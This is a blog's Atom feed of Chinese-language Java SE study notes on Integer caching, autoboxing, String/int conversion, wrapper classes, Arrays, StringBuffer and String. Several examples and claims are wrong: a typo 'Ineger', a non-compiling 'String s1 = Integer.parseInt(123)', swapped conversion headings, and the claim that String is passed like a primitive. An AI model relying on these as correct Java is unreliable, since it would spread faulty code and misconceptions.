<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Ather · Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://liuhaoan.github.io/"/>
  <updated>2019-04-09T09:22:44.443Z</updated>
  <id>http://liuhaoan.github.io/</id>
  
  <author>
    <name>Atcher</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>javaSE复习之——Integer中的常见面试题</title>
    <link href="http://liuhaoan.github.io/2019/04/09/javaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94Integer%E4%B8%AD%E7%9A%84%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/"/>
    <id>http://liuhaoan.github.io/2019/04/09/javaSE复习之——Integer中的常见面试题/</id>
    <published>2019-04-09T09:16:38.000Z</published>
    <updated>2019-04-09T09:22:44.443Z</updated>
    
    <content type="html"><![CDATA[<h1 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h1><a id="more"></a><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">package com.heima.wrapclass;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Demo5_Integer</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @param args</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span>(<span class="params">String[] args</span>)</span> &#123;</span><br><span class="line">Integer i1 = <span class="keyword">new</span> Integer(<span class="number">97</span>);</span><br><span class="line">Integer i2 = <span class="keyword">new</span> Integer(<span class="number">97</span>);</span><br><span class="line">System.<span class="keyword">out</span>.println(i1 == i2);</span><br><span class="line"><span class="comment">//false</span></span><br><span class="line"></span><br><span class="line">System.<span class="keyword">out</span>.println(i1.<span class="keyword">equals</span>(i2));</span><br><span class="line"><span class="comment">//true</span></span><br><span class="line">System.<span class="keyword">out</span>.println(<span class="string">"-----------"</span>);</span><br><span class="line"></span><br><span class="line">Integer i3 = <span class="keyword">new</span> Integer(<span class="number">197</span>);</span><br><span class="line">Integer i4 = <span class="keyword">new</span> Integer(<span class="number">197</span>);</span><br><span class="line">System.<span class="keyword">out</span>.println(i3 == i4);</span><br><span class="line"><span class="comment">//false</span></span><br><span class="line"></span><br><span class="line">System.<span class="keyword">out</span>.println(i3.<span class="keyword">equals</span>(i4));</span><br><span class="line"><span class="comment">//true</span></span><br><span class="line">System.<span class="keyword">out</span>.println(<span class="string">"-----------"</span>);</span><br><span class="line"></span><br><span class="line">Integer i5 = <span class="number">127</span>;</span><br><span class="line">Integer i6 = <span class="number">127</span>;</span><br><span class="line">System.<span class="keyword">out</span>.println(i5 == i6);</span><br><span class="line"><span class="comment">//true</span></span><br><span class="line"></span><br><span class="line">System.<span class="keyword">out</span>.println(i5.<span class="keyword">equals</span>(i6));</span><br><span class="line"><span class="comment">//true</span></span><br><span class="line">System.<span class="keyword">out</span>.println(<span class="string">"-----------"</span>);</span><br><span class="line"></span><br><span class="line">Integer i7 = <span class="number">128</span>;</span><br><span class="line">Integer i8 = <span class="number">128</span>;</span><br><span class="line">System.<span class="keyword">out</span>.println(i7 == i8);</span><br><span class="line">System.<span class="keyword">out</span>.println(i7.<span class="keyword">equals</span>(i8));</span><br><span class="line"><span class="comment">//true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * -128到127是byte的取值范围,如果在这个取值范围内,自动装箱就不会新创建对象,而是从常量池中获取</span></span><br><span class="line"><span class="comment"> * 如果超过了byte取值范围就会再新创建对象</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * public static Integer valueOf(int i) &#123;</span></span><br><span class="line"><span class="comment">        assert IntegerCache.high &gt;= 127;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">//i&gt;= -128 &amp;&amp; i &lt;= 127</span></span><br><span class="line"><span class="comment">        if (i &gt;= IntegerCache.low &amp;&amp; i &lt;= IntegerCache.high)</span></span><br><span class="line"><span class="comment">            return IntegerCache.cache[i + (-IntegerCache.low)];</span></span><br><span class="line"><span class="comment">        return new Integer(i);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ul><li>底层代码可以理解成一个数组，这个数组索引0对应着-128、255对应着127，当传入的值在-128 - 127之间时自动装箱时会直接在这个<code>数组中取值</code>，进而<code>引用地址是一样的</code>，所以上面返回了true</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;代码示例&quot;&gt;&lt;a href=&quot;#代码示例&quot; class=&quot;headerlink&quot; title=&quot;代码示例&quot;&gt;&lt;/a&gt;代码示例&lt;/h1&gt;
    
    </summary>
    
      <category term="JavaSE 复习" scheme="http://liuhaoan.github.io/categories/JavaSE-%E5%A4%8D%E4%B9%A0/"/>
    
    
      <category term="Integer" scheme="http://liuhaoan.github.io/tags/Integer/"/>
    
      <category term="Integer面试题" scheme="http://liuhaoan.github.io/tags/Integer%E9%9D%A2%E8%AF%95%E9%A2%98/"/>
    
      <category term="面试题" scheme="http://liuhaoan.github.io/tags/%E9%9D%A2%E8%AF%95%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>javaSE复习之——JDK5新特性之_自动拆箱与装箱</title>
    <link href="http://liuhaoan.github.io/2019/04/09/javaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94JDK5%E6%96%B0%E7%89%B9%E6%80%A7%E4%B9%8B-%E8%87%AA%E5%8A%A8%E6%8B%86%E7%AE%B1%E4%B8%8E%E8%A3%85%E7%AE%B1/"/>
    <id>http://liuhaoan.github.io/2019/04/09/javaSE复习之——JDK5新特性之-自动拆箱与装箱/</id>
    <published>2019-04-09T09:13:54.000Z</published>
    <updated>2019-04-09T09:15:22.581Z</updated>
    
    <content type="html"><![CDATA[<h1 id="代码详解"><a href="#代码详解" class="headerlink" title="代码详解"></a>代码详解</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> x = <span class="number">123</span>;</span><br><span class="line">Integer i1 = <span class="keyword">new</span> Integer(x);</span><br><span class="line"><span class="comment">//手动装箱</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> y = i1.intValue();</span><br><span class="line"><span class="comment">//手动拆箱</span></span><br><span class="line"></span><br><span class="line">Ineger x = <span class="number">123</span>;</span><br><span class="line"><span class="comment">//自动装箱，他的底层是手动装箱</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> a = x + <span class="number">100</span>;</span><br><span class="line"><span class="comment">//自动拆箱，他的底层是自动拆箱</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;代码详解&quot;&gt;&lt;a href=&quot;#代码详解&quot; class=&quot;headerlink&quot; title=&quot;代码详解&quot;&gt;&lt;/a&gt;代码详解&lt;/h1&gt;&lt;figure class=&quot;highlight cpp&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;
      
    
    </summary>
    
      <category term="JavaSE 复习" scheme="http://liuhaoan.github.io/categories/JavaSE-%E5%A4%8D%E4%B9%A0/"/>
    
    
      <category term="新特性" scheme="http://liuhaoan.github.io/tags/%E6%96%B0%E7%89%B9%E6%80%A7/"/>
    
      <category term="JDK5" scheme="http://liuhaoan.github.io/tags/JDK5/"/>
    
      <category term="自动拆箱" scheme="http://liuhaoan.github.io/tags/%E8%87%AA%E5%8A%A8%E6%8B%86%E7%AE%B1/"/>
    
      <category term="自动装箱" scheme="http://liuhaoan.github.io/tags/%E8%87%AA%E5%8A%A8%E8%A3%85%E7%AE%B1/"/>
    
  </entry>
  
  <entry>
    <title>javaSE复习之——String转换为其他数据类型</title>
    <link href="http://liuhaoan.github.io/2019/04/09/javaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94String%E8%BD%AC%E6%8D%A2%E4%B8%BA%E5%85%B6%E4%BB%96%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/"/>
    <id>http://liuhaoan.github.io/2019/04/09/javaSE复习之——String转换为其他数据类型/</id>
    <published>2019-04-09T09:10:35.000Z</published>
    <updated>2019-04-09T09:12:42.799Z</updated>
    
    <content type="html"><![CDATA[<ul><li><p>代码：</p><blockquote><p>.parseXXX(“”);</p></blockquote></li><li><p>特点：</p><blockquote><p>基本数据类型包装类有八种，其中除了char其他都有<code>.parseXXX()</code>方法，因为char只能存入一个字符。</p></blockquote></li><li><p>代码示例：</p></li></ul><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String <span class="built_in">s1</span> = <span class="string">"123"</span><span class="comment">;</span></span><br><span class="line">int i = Integer.parseInt(<span class="built_in">s1</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;ul&gt;
&lt;li&gt;&lt;p&gt;代码：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;.parseXXX(“”);&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;特点：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;基本数据类型包装类有八种，其中除了char其他都有&lt;code&gt;.pa
      
    
    </summary>
    
      <category term="JavaSE 复习" scheme="http://liuhaoan.github.io/categories/JavaSE-%E5%A4%8D%E4%B9%A0/"/>
    
    
      <category term="String" scheme="http://liuhaoan.github.io/tags/String/"/>
    
      <category term="String转换为其他数据类型" scheme="http://liuhaoan.github.io/tags/String%E8%BD%AC%E6%8D%A2%E4%B8%BA%E5%85%B6%E4%BB%96%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/"/>
    
  </entry>
  
  <entry>
    <title>javaSE复习之——String与int的相互转换</title>
    <link href="http://liuhaoan.github.io/2019/04/09/javaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94String%E4%B8%8Eint%E7%9A%84%E7%9B%B8%E4%BA%92%E8%BD%AC%E6%8D%A2/"/>
    <id>http://liuhaoan.github.io/2019/04/09/javaSE复习之——String与int的相互转换/</id>
    <published>2019-04-09T09:04:41.000Z</published>
    <updated>2019-04-09T09:09:53.670Z</updated>
    
    <content type="html"><![CDATA[<h1 id="String转int"><a href="#String转int" class="headerlink" title="String转int"></a>String转int</h1><blockquote><p>1、String s1 = 1 + “”；</p><p>2、String s2 = string.toString(1);</p><p>3、Integer i = new Integer(1);        String s1 = i.toString();</p><p>4、String s1 = Integer.toString(1);</p></blockquote><p>ps:推荐用第一第二种方式，代码更简洁。</p><a id="more"></a><h1 id="int转String"><a href="#int转String" class="headerlink" title="int转String"></a>int转String</h1><blockquote><p>1、<br><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String <span class="built_in">s1</span> = <span class="string">"123"</span><span class="comment">;</span></span><br><span class="line">Integer i = new Integer(<span class="built_in">s1</span>)<span class="comment">;</span></span><br><span class="line">int a = i.intValue()<span class="comment">;</span></span><br></pre></td></tr></table></figure></p></blockquote><blockquote><p>2、<br><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">String</span> s1 = Integer.<span class="built_in">parseInt</span>(<span class="number">123</span>);</span><br></pre></td></tr></table></figure></p></blockquote><p>ps:推荐用第二种</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;String转int&quot;&gt;&lt;a href=&quot;#String转int&quot; class=&quot;headerlink&quot; title=&quot;String转int&quot;&gt;&lt;/a&gt;String转int&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;1、String s1 = 1 + “”；&lt;/p&gt;
&lt;p&gt;2、String s2 = string.toString(1);&lt;/p&gt;
&lt;p&gt;3、Integer i = new Integer(1);        String s1 = i.toString();&lt;/p&gt;
&lt;p&gt;4、String s1 = Integer.toString(1);&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;ps:推荐用第一第二种方式，代码更简洁。&lt;/p&gt;
    
    </summary>
    
      <category term="JavaSE 复习" scheme="http://liuhaoan.github.io/categories/JavaSE-%E5%A4%8D%E4%B9%A0/"/>
    
    
      <category term="String与int的相互转换" scheme="http://liuhaoan.github.io/tags/String%E4%B8%8Eint%E7%9A%84%E7%9B%B8%E4%BA%92%E8%BD%AC%E6%8D%A2/"/>
    
      <category term="String转int" scheme="http://liuhaoan.github.io/tags/String%E8%BD%ACint/"/>
    
      <category term="int转String" scheme="http://liuhaoan.github.io/tags/int%E8%BD%ACString/"/>
    
  </entry>
  
  <entry>
    <title>javaSE复习之——基本数据类型包装类</title>
    <link href="http://liuhaoan.github.io/2019/04/09/javaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E5%8C%85%E8%A3%85%E7%B1%BB/"/>
    <id>http://liuhaoan.github.io/2019/04/09/javaSE复习之——基本数据类型包装类/</id>
    <published>2019-04-09T08:58:32.000Z</published>
    <updated>2019-04-09T09:03:44.552Z</updated>
    
    <content type="html"><![CDATA[<h1 id="基本数据类型和包装类的对应表"><a href="#基本数据类型和包装类的对应表" class="headerlink" title="基本数据类型和包装类的对应表"></a>基本数据类型和包装类的对应表</h1><table><thead><tr><th>基本数据类型</th><th>包装类</th></tr></thead><tbody><tr><td>byte</td><td>Byte</td></tr><tr><td>short</td><td>Short</td></tr><tr><td>long</td><td>Long</td></tr><tr><td>float</td><td>Float</td></tr><tr><td>double</td><td>Double</td></tr><tr><td>boolean</td><td>Boolean</td></tr></tbody></table><p>—————–上面的只是改大写，下面的改的更多<br><a id="more"></a></p><table><thead><tr><th>基本数据类型</th><th>包装类</th></tr></thead><tbody><tr><td>int</td><td>Integer</td></tr><tr><td>char</td><td>Character</td></tr></tbody></table><h1 id="Integer的特点："><a href="#Integer的特点：" class="headerlink" title="Integer的特点："></a>Integer的特点：</h1><blockquote><p>1、能在int和String类型之间相互转换</p><p>2、提供了处理int类型时，非常有用的其他一些常量和方法。</p><p>3、能在创建对象时传入String类型的数据，但只<code>限于int值</code>。</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;基本数据类型和包装类的对应表&quot;&gt;&lt;a href=&quot;#基本数据类型和包装类的对应表&quot; class=&quot;headerlink&quot; title=&quot;基本数据类型和包装类的对应表&quot;&gt;&lt;/a&gt;基本数据类型和包装类的对应表&lt;/h1&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;基本数据类型&lt;/th&gt;
&lt;th&gt;包装类&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;byte&lt;/td&gt;
&lt;td&gt;Byte&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;short&lt;/td&gt;
&lt;td&gt;Short&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;long&lt;/td&gt;
&lt;td&gt;Long&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;float&lt;/td&gt;
&lt;td&gt;Float&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;double&lt;/td&gt;
&lt;td&gt;Double&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;boolean&lt;/td&gt;
&lt;td&gt;Boolean&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;—————–上面的只是改大写，下面的改的更多&lt;br&gt;
    
    </summary>
    
      <category term="JavaSE 复习" scheme="http://liuhaoan.github.io/categories/JavaSE-%E5%A4%8D%E4%B9%A0/"/>
    
    
      <category term="基本数据类型包装类" scheme="http://liuhaoan.github.io/tags/%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E5%8C%85%E8%A3%85%E7%B1%BB/"/>
    
  </entry>
  
  <entry>
    <title>javaSE复习之——Arrays类</title>
    <link href="http://liuhaoan.github.io/2019/04/09/javaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94Arrays%E7%B1%BB/"/>
    <id>http://liuhaoan.github.io/2019/04/09/javaSE复习之——Arrays类/</id>
    <published>2019-04-09T08:51:02.000Z</published>
    <updated>2019-04-09T08:57:34.400Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Arrays类的概述"><a href="#Arrays类的概述" class="headerlink" title="Arrays类的概述"></a>Arrays类的概述</h1><blockquote><p>它其实就是一个数组的工具类，提供各种关于数组的操作</p></blockquote><a id="more"></a><h1 id="Arrats的方法："><a href="#Arrats的方法：" class="headerlink" title="Arrats的方法："></a>Arrats的方法：</h1><ul><li>.toString()<blockquote><p>数组转换为字符串</p></blockquote></li><li>.sort()<blockquote><p>数组排序</p></blockquote></li><li>.binarySearch()<blockquote><p>二分查找，<code>返回索引值</code>，如果没找到就返回，<code>被查找数据在数组中应该出现的插入点的负数 减去1</code></p><p>前提：这个数组是一个序列数组</p></blockquote></li><li>.asList()<blockquote><p>把数组转换成集合，用List引用。<br>例子：</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">List</span>&lt;<span class="keyword">String</span>&gt; l = <span class="keyword">Arrays</span>.asList(数组);</span><br></pre></td></tr></table></figure></blockquote></li></ul><ul><li>数组转集合的意义：<blockquote><p>虽然从<code>数组转换成的集合</code>不能增加和减少，但是我们可以用集合的思想来操作数组，也就是用集合除add、remove以外的方法。</p></blockquote></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Arrays类的概述&quot;&gt;&lt;a href=&quot;#Arrays类的概述&quot; class=&quot;headerlink&quot; title=&quot;Arrays类的概述&quot;&gt;&lt;/a&gt;Arrays类的概述&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;它其实就是一个数组的工具类，提供各种关于数组的操作&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="JavaSE 复习" scheme="http://liuhaoan.github.io/categories/JavaSE-%E5%A4%8D%E4%B9%A0/"/>
    
    
      <category term="Arrays类" scheme="http://liuhaoan.github.io/tags/Arrays%E7%B1%BB/"/>
    
  </entry>
  
  <entry>
    <title>javaSE复习之——StringBuffer类</title>
    <link href="http://liuhaoan.github.io/2019/04/09/javaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94StringBuffer%E7%B1%BB/"/>
    <id>http://liuhaoan.github.io/2019/04/09/javaSE复习之——StringBuffer类/</id>
    <published>2019-04-09T08:31:59.000Z</published>
    <updated>2019-04-09T08:49:48.694Z</updated>
    
    <content type="html"><![CDATA[<h1 id="StringBuffer的概述"><a href="#StringBuffer的概述" class="headerlink" title="StringBuffer的概述"></a>StringBuffer的概述</h1><blockquote><p>1、它是<code>字符串缓冲区</code>（容器），底层默认是长度为16的<code>字符数组</code>。</p><p>2、StringBuffer是<code>线程安全</code>的，StringBuilder是<code>线程不安全</code>的</p><p>3、线程安全速度更<code>慢</code>，线程不安全速度更<code>快</code>。</p></blockquote><a id="more"></a><h1 id="StringBuffer与String的区别"><a href="#StringBuffer与String的区别" class="headerlink" title="StringBuffer与String的区别"></a>StringBuffer与String的区别</h1><blockquote><p>1、String赋的值它是<code>不能被改变的</code>，只能丢弃重新创建，<code>如果字符拼接过多会产生过多的垃圾</code>。</p><p>2、StringBuffer赋的值是<code>可以被改变的</code>，类似字符拼接<code>建议</code>用这个类，因为<code>不会产生过多的垃圾</code>。</p><p>2、虽然它们都是<code>引用数据类型</code>，但是String<code>做参数</code>传递时是和基本数据类型一样的，而StringBuffer传递的只是对创建对象的引用，也就是地址值。</p></blockquote><h1 id="StringBuffer的方法"><a href="#StringBuffer的方法" class="headerlink" title="StringBuffer的方法"></a>StringBuffer的方法</h1><ul><li>属性获取：<blockquote><p>.capacity()<br>返回当前容量</p><p>.length()<br>返回实际长度</p></blockquote></li></ul><ul><li>数据添加：<blockquote><p>.append()<br>把任何数据传入字符串缓冲区，然后返回缓冲区对象本身。</p><p>.insert(索引,字符串)<br>在任意位置之后将任意类型数据插入字符串缓冲取内，返回本身。</p></blockquote></li></ul><ul><li>数据删除：<blockquote><p>.deleteCharAt()<br>删除任意索引的数据，返回本身。</p><p>.delete(索引1,索引2)<br>删除从索引1开始到索引2位置的数据，返回本身。（包含头不包含尾）</p></blockquote></li></ul><ul><li>数据替换反转：<blockquote><p>.reverse()<br>字符反转</p><p>.replace(开始索引，结束索引，要替换的数据)&gt;<br>字符替换</p></blockquote></li></ul><ul><li>数据截取：（截取后返回的数据不是表示容器本身，而是返回一个String）<blockquote><p>.subString(索引)<br>从索引开始，截取到字符串末尾。</p><p>.subString(开始,结尾)<br>从开始位置截取字符串到结尾位置，不包括结尾索引。    </p></blockquote></li></ul><h1 id="StringBuffer的构造方法特点"><a href="#StringBuffer的构造方法特点" class="headerlink" title="StringBuffer的构造方法特点"></a>StringBuffer的构造方法特点</h1><blockquote><p>1、无参构造默认容量为 <code>16个字符</code></p><p>2、传入整数，比如传入10，那么这个容器的<code>容量</code>就为10个字符</p><p>3、传入一个字符串，比如传入：啊啊，那么实际长度为4，<code>字符串缓冲区容量为20</code></p><p>4、如果<code>内部缓冲区溢出</code>，那么容量自动增大。</p><p>5、StringBuffer重写了toString()方法，显示的是它的属性值，也就是它的元素。</p></blockquote><h1 id="StringBuffer注意事项"><a href="#StringBuffer注意事项" class="headerlink" title="StringBuffer注意事项"></a>StringBuffer注意事项</h1><blockquote><p>1、不要利用重新创建另一个对象来试图<code>清空容器</code>，这只是<code>引用了另一个容器对象</code>而已，之前的那个容器并没有被清空，可以利用<code>delete</code>方法清空容器。</p><p>2、因为String与任意字符串<code>相加</code>的底层实现就是使用容器，并且String的值是<code>不能修改的</code>，它只能把之前的数据做垃圾处理重新创建一个数据，这样会<code>不断的产生垃圾</code>，所以在类似 <code>字符串数组</code> 转换成 <code>字符串</code> 或者 <code>字符串拼接</code>（String s = s1 + s2；） 的例程中使用容器最好。</p></blockquote><h1 id="StringBuffer与String的互转："><a href="#StringBuffer与String的互转：" class="headerlink" title="StringBuffer与String的互转："></a>StringBuffer与String的互转：</h1><ul><li>StringBuffer转String<blockquote><p>1、创建一个String对象，把容器传进去。</p><p>2、使用toString()方法。</p><p>3、使用subString()方法。</p></blockquote></li></ul><ul><li>String转StringBuffer<blockquote><p>1、创建一个StringBuffer对象，传入字符串即可。</p><p>2、通过append()方法把字符串加入到容器内。</p></blockquote></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;StringBuffer的概述&quot;&gt;&lt;a href=&quot;#StringBuffer的概述&quot; class=&quot;headerlink&quot; title=&quot;StringBuffer的概述&quot;&gt;&lt;/a&gt;StringBuffer的概述&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;1、它是&lt;code&gt;字符串缓冲区&lt;/code&gt;（容器），底层默认是长度为16的&lt;code&gt;字符数组&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;2、StringBuffer是&lt;code&gt;线程安全&lt;/code&gt;的，StringBuilder是&lt;code&gt;线程不安全&lt;/code&gt;的&lt;/p&gt;
&lt;p&gt;3、线程安全速度更&lt;code&gt;慢&lt;/code&gt;，线程不安全速度更&lt;code&gt;快&lt;/code&gt;。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="JavaSE 复习" scheme="http://liuhaoan.github.io/categories/JavaSE-%E5%A4%8D%E4%B9%A0/"/>
    
    
      <category term="StringBuffer类" scheme="http://liuhaoan.github.io/tags/StringBuffer%E7%B1%BB/"/>
    
  </entry>
  
  <entry>
    <title>javaSE复习之——String类</title>
    <link href="http://liuhaoan.github.io/2019/04/09/javaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94String%E7%B1%BB/"/>
    <id>http://liuhaoan.github.io/2019/04/09/javaSE复习之——String类/</id>
    <published>2019-04-09T07:42:02.000Z</published>
    <updated>2019-04-09T08:31:15.266Z</updated>
    
    <content type="html"><![CDATA[<h1 id="String类的概述"><a href="#String类的概述" class="headerlink" title="String类的概述"></a>String类的概述</h1><ul><li>它的实例用来存储字符串，在平时的使用中我们会经常用到，通常初学者会以为它是一个<code>基本数据类型</code>，但其实它是一个<code>引用数据类型</code>.</li></ul><a id="more"></a><h1 id="String类特点："><a href="#String类特点：" class="headerlink" title="String类特点："></a>String类特点：</h1><ul><li>1、String实际上是一个类，它重写了toString方法，所以创建String引用后<code>直接输出调用该引用的名称</code>就可以输出<code>字符串</code>数据。</li></ul><ul><li>2、String属于<code>引用数据类型</code>，而不是<code>基本数据类型</code>，基本数据类型为：int、char。。。，所以String数据对比需要用到<code>equals</code>方法，否则会出现判断不准确的问题</li></ul><ul><li>3、String没有set和get方法，所以它<code>不存在修改数据</code>，只能是<code>替换数据</code>，把之前的数据当作垃圾。</li></ul><ul><li>4、String s = “abc”     与 String a = “abc”    它们两个变量其实是记录了<code>常量池中的地址值</code>，而常量池有个特性，就是<code>已有的数据它不会再去创建</code>，所以 <code>s==a为ture</code></li></ul><ul><li>5、<code>String s = &quot;a&quot; + &quot;b&quot; + &quot;c&quot;</code>    同等于<code>String a = &quot;abc&quot;</code>    因为java有<code>常量优化机制</code>，java编译时已经确定<code>s = abc</code>，所以s拿到的是常量abc的地址。</li></ul><ul><li>6、</li></ul><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">String <span class="selector-tag">b</span> = <span class="string">"ab"</span></span><br><span class="line">String c = <span class="string">"abc"</span></span><br><span class="line">c == <span class="selector-tag">a</span> + <span class="string">"c"</span></span><br><span class="line"><span class="comment">//结果为false</span></span><br></pre></td></tr></table></figure><blockquote><p>解析：因为<code>任何数据</code>与<code>字符串用 + 连接</code>，会在堆内存中创建<code>StringBuider</code> 或 <code>StringBuffer</code>缓冲区对象并使用append方法<code>把数据相连</code>，这里会得出：<code>&quot;abc&quot;</code>然后再使用toString方法<code>创建一个“abc”的String对象返回</code>这个”abc”被保存在<code>堆内存</code>中，而不是保存在<code>常量池</code>，所以变量c的值是<code>常量池</code>中的地址，而a + “c”是<code>堆内存</code>中的地址，所以用“==”号做比较返回false</p></blockquote><ul><li>7、String赋的值是<code>不可以被改变的</code>，只有把之前的值丢弃变成垃圾后，再赋新的值。</li></ul><ul><li>8、String虽然是<code>引用数据类型</code>，但是它当作参数传递的时候，它是和基本数据类型一样的。</li></ul><h1 id="获取键盘输入String需要注意的"><a href="#获取键盘输入String需要注意的" class="headerlink" title="获取键盘输入String需要注意的"></a>获取键盘输入String需要注意的</h1><blockquote><p>System.in</p><p>它是标准的输入流，对应着键盘录入</p><p>sc.hasNextxxx（）</p><p>它判断输入的数是不是xxx数据类型，xxx可以是int、double等</p><p>sc.nextxxx（）</p><p>它获取已经输入的项，xxx和上面的xxx相同</p><p>sc.nextLine()</p><p>它获取字符串，遇到/r/n就结束，也是因为这个机制，所以和其他获取输入命令混用会出现获取不到的问题，举个例子。</p><p>例：nextInt() 之后又用 nexiLine()</p><p>获取的是整数，而实际是全部内容为  <code>数值/r/n</code>  